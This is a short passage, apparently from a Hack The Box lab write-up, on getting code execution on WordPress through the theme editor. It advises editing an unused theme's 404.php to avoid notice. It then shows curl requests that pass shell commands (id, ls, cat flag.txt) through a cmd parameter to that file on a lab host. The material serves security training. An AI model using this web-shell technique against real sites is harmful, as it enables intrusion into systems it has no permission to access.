...
![WordPress theme editor showing Transportex stylesheet with theme details and code.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/17/Theme-Editor.png)

We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.

#### Selecting Theme

![WordPress theme editor showing Twenty Seventeen stylesheet with theme details and code.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/17/Twenty-Seventeen.png)
...
```shell
Jfou@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
...
```shell
┌──(root㉿kaljfou)-[~]
└─# curl -X GET 'http://154.57.164.83:32066/wp-content/themes/twentyseventeen/404.php?cmd=ls%20~/'
flag.txt

┌──(root㉿kaljfou)-[~]
└─# curl -X GET 'http://154.57.164.83:32066/wp-content/themes/twentyseventeen/404.php?cmd=cat%20~/flag.txt'
HTB{...}
```